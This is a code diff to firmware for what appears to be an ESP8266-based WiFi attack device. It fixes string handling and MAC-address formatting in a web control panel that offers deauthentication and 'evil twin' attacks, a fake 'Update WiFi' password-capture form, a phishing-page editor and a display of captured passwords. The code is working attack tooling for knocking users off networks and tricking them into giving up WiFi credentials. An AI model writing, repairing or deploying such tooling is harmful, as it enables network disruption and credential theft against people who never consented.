@@ -7,7 +7,9 @@
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
 
-extern "C" { #include "user_interface.h" }
+extern "C" {
+  #include "user_interface.h"
+}
 
 // --- OLED CONFIG (0.66" 64x48) ---
 #define SCREEN_WIDTH 64
@@ -79,7 +81,7 @@ String readHtml() {
   char data[360]; int start = 150;
   for (int i = 0; i < 360; i++) { data[i] = EEPROM.read(start + i); if (data[i] == '\0' || (uint8_t)data[i] == 255) { data[i] = '\0'; break; } }
   String res = String(data);
-  return (res.length() < 10) ? "<h2>Update WiFi</h2><form method='POST' action='/login'>Pass:<br><input name='p' type='password'><input type='submit' value='OK'></form>" : res;
+  return (res.length() < 10) ? String("<h2>Update WiFi</h2><form method='POST' action='/login'>Pass:<br><input name='p' type='password'><input type='submit' value='OK'></form>") : res;
 }
 
 // --- ATTACK ---
@@ -106,7 +108,11 @@ void handleIndex() {
     String b = webServer.arg("ap");
     for (int i=0; i<16; i++) {
       String mac = "";
-      for (int j=0; j<6; j++) { mac += String(networks[i].bssid[j], HEX); if(j<5) mac+=":"; }
+      for (int j=0; j<6; j++) { 
+        if (networks[i].bssid[j] < 0x10) mac += "0";
+        mac += String(networks[i].bssid[j], HEX); 
+        if(j<5) mac+=":"; 
+      }
       if (mac == b) selectedNetwork = networks[i];
     }
   }
@@ -129,25 +135,25 @@ void handleIndex() {
 
   // DASHBOARD
   p += "<div id='t0'><div class='cmd-box'>";
-  p += "<form method='post' action='/?deauth="+(deauthing_active?"stop":"start")+"'><button style='width:100%;padding:12px;background:"+(deauthing_active?"#f00":"#222")+";color:#fff'>DEAUTH</button></form>";
-  p += "<div class='log'>"+(deauthing_active?"[!] ATTACKING: "+selectedNetwork.ssid:"[-] STATUS: IDLE")+"</div></div>";
+  p += "<form method='post' action='/?deauth=" + String(deauthing_active ? "stop" : "start") + "'><button style='width:100%;padding:12px;background:" + String(deauthing_active ? "#f00" : "#222") + ";color:#fff'>DEAUTH</button></form>";
+  p += "<div class='log'>" + String(deauthing_active ? "[!] ATTACKING: " + selectedNetwork.ssid : "[-] STATUS: IDLE") + "</div></div>";
 
-  p += "<div class='cmd-box'><form method='post' action='/?hotspot="+(hotspot_active?"stop":"start")+"'><button style='width:100%;padding:12px;background:"+(hotspot_active?"#a53":"#222")+";color:#fff'>EVIL TWIN</button></form>";
-  p += "<div class='log'>"+(hotspot_active?"[!] HOTSPOT ACTIVE":"[-] STATUS: OFF")+"</div></div>";
+  p += "<div class='cmd-box'><form method='post' action='/?hotspot=" + String(hotspot_active ? "stop" : "start") + "'><button style='width:100%;padding:12px;background:" + String(hotspot_active ? "#a53" : "#222") + ";color:#fff'>EVIL TWIN</button></form>";
+  p += "<div class='log'>" + String(hotspot_active ? "[!] HOTSPOT ACTIVE" : "[-] STATUS: OFF") + "</div></div>";
 
-  p += "<div class='cmd-box' style='background:#050'><b>PASS:</b> <span style='color:#fff'>"+(readPass()==""?"WAIT..":readPass())+"</span></div>";
+  p += "<div class='cmd-box' style='background:#050'><b>PASS:</b> <span style='color:#fff'>" + (readPass() == "" ? "WAIT.." : readPass()) + "</span></div>";
 
   p += "<table><tr><th>SSID</th><th>CH</th><th>RSSI</th><th>SEL</th></tr>";
   for(int i=0;i<16;i++){ if(networks[i].ssid=="")continue;
-    String mac = ""; for(int j=0;j<6;j++){ mac += String(networks[i].bssid[j], HEX); if(j<5)mac+=":"; }
-    p += "<tr><td>"+networks[i].ssid+"</td><td>"+String(networks[i].ch)+"</td><td>"+String(networks[i].rssi)+"</td>";
-    p += "<td><form method='post' action='/?ap="+mac+"'><button style='background:orange;border:none'>OK</button></form></td></tr>";
+    String mac = ""; for(int j=0;j<6;j++){ if(networks[i].bssid[j]<0x10) mac+="0"; mac += String(networks[i].bssid[j], HEX); if(j<5)mac+=":"; }
+    p += "<tr><td>" + networks[i].ssid + "</td><td>" + String(networks[i].ch) + "</td><td>" + String(networks[i].rssi) + "</td>";
+    p += "<td><form method='post' action='/?ap=" + mac + "'><button style='background:orange;border:none'>OK</button></form></td></tr>";
   }
   p += "</table></div>";
 
   // SETTINGS
   p += "<div id='t1' class='hidden'><div class='cmd-box' style='text-align:left'><b>PHISHING EDITOR</b><br>";
-  p += "<form method='post' action='/?saveHtml=1'><textarea id='hi' name='newHtml' oninput='up()'>"+readHtml()+"</textarea><button style='width:100%;padding:10px;background:orange;border:none'>SAVE</button></form>";
+  p += "<form method='post' action='/?saveHtml=1'><textarea id='hi' name='newHtml' oninput='up()'>" + readHtml() + "</textarea><button style='width:100%;padding:10px;background:orange;border:none'>SAVE</button></form>";
   p += "<div style='color:orange;margin-top:10px'><b>LIVE PREVIEW:</b></div><div id='pv' class='prev'></div></div></div>";
 
   p += "<script>function openT(n){document.getElementById('t0').classList.toggle('hidden',n!=0);document.getElementById('t1').classList.toggle('hidden',n!=1);";
